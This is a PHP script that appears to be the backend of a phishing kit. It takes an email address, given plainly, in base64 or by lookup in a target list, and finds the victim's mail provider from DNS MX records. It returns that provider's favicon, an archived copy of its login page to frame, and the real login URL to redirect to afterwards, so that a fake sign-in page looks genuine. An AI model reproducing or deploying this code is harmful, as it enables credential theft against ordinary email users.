<?php

// Set CORS headers to allow any origin
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Access-Control-Allow-Headers: Origin, Content-Type, X-Auth-Token");


$icodict = array(
    "1and1.com" => "https://www.ionos.com/favicon.ico",
    "21cn.com" => "https://mail.21cn.com/w2/favicon.ico",
    "mxcom.263xmail.com" => "http://wm.263xmail.com/custom_login/images/favicon.ico?v=10174",
    "mxw.263.net" => "http://wm.263xmail.com/custom_login/images/favicon.ico?v=10174",
    "dm.aliyun.com" => "https://qiye.aliyun.com/static/6173578/images/favicon.ico",
    "mxhichina.com" => "https://qiye.aliyun.com/static/6173578/images/favicon.ico",
    "aliyun.com" => "https://qiye.aliyun.com/static/6173578/images/favicon.ico",
    "mx-aol" => "https://s.yimg.com/wm/login/aol-favicon.png",
    "biz1.qq.com" => "https://exmail.qq.com/exmail_logo.ico",
    "netease.com" => "https://email.163.com/favicon.ico",
    "ym.163.com" => "https://email.163.com/favicon.ico",
    "secureserver.net" => "https://img6.wsimg.com/ux/favicon/apple-icon-57x57.png",
    "google.com" => "https://ssl.gstatic.com/ui/v1/icons/mail/rfr/gmail.ico",
    "hgcbizmail.com" => "https://webmail.hgcbizmail.com/CookieAuth.dll?GetPic?formdir=3&image=favicon.ico",
    "naver.com" => "https://www.naver.com/favicon.ico",
    "outlook.com" => "https://outlook.office.com/mail/favicon.ico",
    "yahoodns.net" => "https://s.yimg.com/rz/l/favicon.ico",
    "mx.yandex.ru" => "https://mail.yandex.com/u2709/favicon/ico/main-favicon.ico",
    "privateemail.com" => "https://privateemail.com/appsuite/login-assets/images/favicon.ico",
    "securemail-mx3.synaq.com" => "https://www.mweb.co.za/favicon.ico?v=2",
    "mail.ru" => "https://home.imgsmail.ru/resplash/143498/i/meta/favicon.ico",
    "global-mail.cn" => "https://mail.global-mail.cn/customlogin/mail.global-mail.cn/resource/favicon.ico?v=100000",
    "icoremail.net" => "https://mail.icoremail.net/",
    "zmail300.cn" => "https://mail.zmail300.cn/customlogin/mail.zmail300.cn/resource/favicon-wm.ico?v=100000",
    "sinanet.com" => "https://mail.sina.net/favicon.ico",
    "sina.com" => "https://mail.sina.net/favicon.ico",
    "cn4e.com" => "https://w.cn4e.com/login/favicon.ico",
    "rediffmail" => "https://im.rediff.com/favicon.ico",
    "protonmail" => "https://proton.me/favicons/favicon.ico",
    "hinet.net" => "https://www.hinet.net/resources/images/favicon.ico",
);


$pages = array(
    "securemail-mx3.synaq.com" =>
        "https://web.archive.org/web/20181217103240/https://www.mweb.co.za/user-login",
    "mailplug.com" =>
        "https://web.archive.org/web/20230402023052/https://login.mailplug.com/",
    "1and1.com" =>
        "https://web.archive.org/web/20230404151844/https://mail.ionos.com/",
    "21cn.com" =>
        "https://web.archive.org/web/20181226074716/http://mail.21cn.com/w2/",
    "263xmail.com" =>
        "https://web.archive.org/web/20220124201320/http://wm.263xmail.com/",
    "263.net" =>
        "https://web.archive.org/web/20230330162508/https://mail.263.net/",
    "dm.aliyun.com" => "https://web.archive.org/web/20230326154436/https://qiye.aliyun.com/",
    "mxhichina.com" =>
        "https://web.archive.org/web/20230326154436/https://qiye.aliyun.com/",
    "qiye.aliyun.com" =>
        "https://web.archive.org/web/20230326154436/https://qiye.aliyun.com/",
    "mail.aliyun.com" =>
        "https://web.archive.org/web/20230405145437/https://mail.aliyun.com/",
    "mx-aol.mail.gm0.yahoodns.net" =>
        "https://web.archive.org/web/20181226074603/https://login.aol.com/",
    "biz1.qq.com" =>
        "https://web.archive.org/web/20210531043052/https://exmail.qq.com/login",
    "chinaemail.cn" =>
        "https://web.archive.org/web/20220501171939/https://mail.chinaemail.cn/login.php",
    "ym.163.com" => "https://qy.163.com/login/",
    "hzmx01.mxmail.netease.com" => "https://qy.163.com/login/",
    "qiye163mx" => "https://qy.163.com/login/",
    "163mx" => "https://mail.163.com",
    "126mx" => "https://mail.126.com",
    "yeahmx01.mxmail.netease.com" => "https://mail.yeah.net",
    "secureserver.net" =>
        "https://web.archive.org/web/20181226075610/https://sso.godaddy.com/login?realm=pass&app=email",
    "naver.com" =>
        "https://web.archive.org/web/20220204051537/https://nid.naver.com/nidlogin.login?mode=form&url=https%3A%2F%2Fnid.naver.com%2Fuser2%2Fapi%2Froute%3Fm%3DroutePcMyInfo",
    "outlook.com" =>
        "https://web.archive.org/web/20200627031608/https://login.live.com/login.srf?lc=1033",
    "mta5.am0.yahoodns.net" =>
        "https://web.archive.org/web/20181226074247/https://login.yahoo.com/",
    "yandex.ru" =>
        "https://web.archive.org/web/20181117200324/https://passport.yandex.ru/auth?from=cloud&origin=disk_narod_ru&retpath=https%3A%2F%2Fdisk.yandex.ru%2Fclient%2Fnarod%2F%3Fsource%3Dnarod&backpath=https%3A%2F%2Fdisk.yandex.ru",
    "privateemail.com" =>
        "https://web.archive.org/web/20230403234237/https://privateemail.com//",
    "mail.ru" =>
        "https://web.archive.org/web/20181221174730/https://mail.ru/",
    "global-mail.cn" =>
        "https://web.archive.org/web/20210417061043/http://mail.global-mail.cn/webmail/login.php?msg=login",
    "icoremail.net" =>
        "https://web.archive.org/web/20201127142449/https://mail.icoremail.net/",
    "sinamail.sina.com.cn" =>
        "https://web.archive.org/web/20181226075055/https://vip.sina.com.cn/",
    "sinanet.com" =>
        "https://web.archive.org/web/20181226075055/https://vip.sina.com.cn/",
    "vip.sina.com" =>
        "https://web.archive.org/web/20230404020500/https://mail.sina.cn/?page=vipmail&vt=4",
    "cn4e.com" => "https://w.cn4e.com/",
    "rediffmail" => "https://f4mail.rediff.com/",
    "protonmail" => "https://mail.protonmail.ch",
    "hinet.net" => "https://webmail.hinet.net/",
    "zmail300.cn" => "https://mail.zmail300.cn/webmail/login.php",
    "hgcbizmail.com" => "https://webmail.hgcbizmail.com/",
    "mimecast.com" =>
        "https://webmail.mimecast.com/u/login/?gta=portal#/login",
);


$logpages = array(
    "1and1.com" => "https://mail.ionos.com/",
    "21cn.com" => "https://mail.21cn.com/",
    "263xmail.com" => "http://wm.263xmail.com/",
    "263.net" => "https://mail.263.net/",
    "dm.aliyun.com" => "https://qiye.aliyun.com/",
    "mxhichina.com" => "https://qiye.aliyun.com/",
    "qiye.aliyun.com" => "https://qiye.aliyun.com/",
    "mx-aol.mail.gm0.yahoodns.net" => "https://login.aol.com/",
    "biz1.qq.com" => "https://exmail.qq.com/login",
    "chinaemail.cn" => "https://mail.chinaemail.cn/login.php",
    "163mx" => "https://mail.163.com",
    "126mx" => "https://mail.126.com",
    "yeahmx" => "https://mail.yeah.net",
    "mx.ym.163.com" => "https://qiye.163.com/login/",
    "hzmx01.mxmail.netease.com" => "https://qiye.163.com/login/",
    "mailstore1.secureserver.net" =>
        "https://sso.godaddy.com/login?realm=pass&app=email",
    "google.com" => "https://gmail.com",
    "hgcbizmail.com" => "https://webmail.hgcbizmail.com/",
    "mimecast.com" =>
        "https://webmail.mimecast.com/u/login/?gta=portal#/login",
    "naver.com" => "https://nid.naver.com/nidlogin.login",
    "outlook.com" => "https://outlook.office.com/",
    "yahoodns.net" => "https://login.yahoo.com/",
    "yandex.ru" => "http://mail.yandex.com/",
    "privateemail.com" => "https://privateemail.com/",
    "securemail-mx3.synaq.com" => "https://www.mweb.co.za/user-login",
    "mailplug.com" => "https://login.mailplug.com",
    "mail.ru" => "https://mail.ru",
    "global-mail.cn" =>
        "https://mail.global-mail.cn/webmail/login.php?msg=login",
    "icoremail.net" => "https://mail.icoremail.net/",
    "zmail300.cn" => "https://mail.zmail300.cn/webmail/login.php",
    "sinamail.sina.com.cn" => "http://mail.sina.com/",
    "sinanet.com" => "http://mail.sina.com/",
    "vip.sina.com" => "https://vip.sina.com.cn/",
    "cn4e.com" => "https://w.cn4e.com/",
    "rediffmail" => "https://f4mail.rediff.com/",
    "protonmail.ch " => "https://mail.protonmail.ch",
    "netnews.hinet.net" => "https://mail.hinet.net/",
    "biz-mx1.hinet.net" => "https://webmail.hinet.net/",
);

function getFavicon($emailAddress)
{
    global $icodict;
    try {
        $domain = explode("@", $emailAddress)[1];
        $mxRecord = getMXRecords($emailAddress);

        $redirect_to = "";
        $redirect_to = getMailbox($mxRecord, $icodict);

        if (!$redirect_to) {
            $faviconURL = "https://www.google.com/s2/favicons?domain=" . $domain;
            $redirect_to = $faviconURL;
        }

        return $redirect_to;
    } catch (Exception $error) {
        echo $error->getMessage();
    }
}

function getMXRecords($emailAddress)
{
    // Validate email address format
    if (!filter_var($emailAddress, FILTER_VALIDATE_EMAIL)) {
        throw new InvalidArgumentException("Invalid email address format");
    }

    $domain = explode("@", $emailAddress)[1];
    $apiURLs = [
        "https://dns.google/resolve?name=" . $domain . "&type=MX",
        "https://cloudflare-dns.com/dns-query?name=" . $domain . "&type=MX"
    ];

    foreach ($apiURLs as $apiURL) {
        try {
            $response = file_get_contents($apiURL, false, stream_context_create(['http' => ['header' => 'Accept: application/dns-json']]));
            $data = json_decode($response);

            // Check if the response is valid
            if (!isset($data->Answer) || !is_array($data->Answer)) {
                continue;
            }

            $mxRecords = array_filter($data->Answer, function ($record) {
                return $record->type === 15;
            });

            $mxRecords = array_map(function ($record) {
                return $record->data;
            }, $mxRecords);

            if (count($mxRecords) > 0) {
                // echo json_encode($mxRecords);
                return $mxRecords;
            }
        } catch (Exception $err) {
            // Log the error instead of echoing it
            error_log("Error fetching MX records from $apiURL: " . $err->getMessage());
        }
    }

    // If no MX records found, handle the case gracefully
    return [];
}

function getMailbox($exchanges, $dictionary)
{
    $redirect_to = "";
    foreach ($dictionary as $domain => $value) {
        foreach ($exchanges as $exchange) {
            if (strpos($exchange, $domain) !== false) {
                $redirect_to = $dictionary[$domain];
                break;
            }
        }
        if ($redirect_to) {
            break;
        }
    }
    return $redirect_to;
}


function addIframeToContainer($emailAddress)
{
    global $pages;
    try {
        $domain = explode("@", $emailAddress)[1];
        $mxRecord = getMXRecords($emailAddress);
        $mailboxURL = getMailbox($mxRecord, $pages) ?: "https://mail.$domain";

        return $mailboxURL;
    } catch (Exception $error) {
        echo $error->getMessage();
    }
}

function getEmail($address)
{
    // Address is not in Base64, try validating it as is
    if (filter_var($address, FILTER_VALIDATE_EMAIL)) {
        $emailFromUrl = $address; // Set emailFromUrl to the valid email address
        return $emailFromUrl;
    }
    
    $decodedAddress = base64_decode($address);
    // Address is in Base64, validate the decoded address
    if (filter_var($decodedAddress, FILTER_VALIDATE_EMAIL)) {
        $emailFromUrl = $decodedAddress; // Set emailFromUrl to the valid email address
        return $emailFromUrl;
    }
    
    try {
        $emailFromUrl = getEmailFromHash($address);
        return $emailFromUrl;
    } catch (Exception $error) {
        echo $error->getMessage();
        return null;
    }
}


function getEmailInfo($emailAddress)
{
    global $logpages;
    try {
        $emailAddress = getEmail($emailAddress);

        if (!$emailAddress) {
            throw new Exception("Invalid email address");
        }
        $domain = explode("@", $emailAddress)[1];
        $favico = getFavicon($emailAddress);
        $container_frame = addIframeToContainer($emailAddress);
        $login_page = $logpages[$domain] ?? "http://mail.$domain";

        $result = [
            'favico' => $favico,
            'container_frame' => $container_frame,
            'email_address' => $emailAddress,
            'end_page' => $login_page,
            'status' => 'success',
        ];

        echo json_encode($result);
        return json_encode($result);
    } catch (Exception $error) {
        $result = [
            'status' => 'error',
            'error_message' => $error->getMessage()
        ];
        echo json_encode($result);
        return json_encode($result);
    }
}


function getEmailFromHash($hashedEmail)
{
    $filename = 'list.txt';
    $file = fopen($filename, 'r');

    if (!$file) {
        return null;
    }

    $index = array();

    while (($line = fgets($file)) !== false) {
        $parts = preg_split('/=/', $line);

        $email = trim($parts[0]);
        $md5 = trim($parts[1]);
        //   $index[$md5] = $email;
        $index[$email] = $md5;
    }

    fclose($file);

    if (isset($index[$hashedEmail])) {
        return $index[$hashedEmail];
    } else {
        return null;
    }
}

// Get the JSON data from the request body
$requestData = json_decode(file_get_contents("php://input"));

if (isset($requestData->email_address)) {
    $emailAddress = $requestData->email_address;
    // echo $emailAddress;

    // Call getEmailInfo with the email address
    $response = getEmailInfo($emailAddress);

    // Return the response
} else {
    // Handle the case where the email address is not provided in the request.
    $result = [
        'status' => 'error',
        'error_message' => 'Email address not provided in the request.'
    ];
    echo json_encode($result);
}
// getEmailInfo("cGV0ZXJ5dTMyQDE2My5jb20");

?>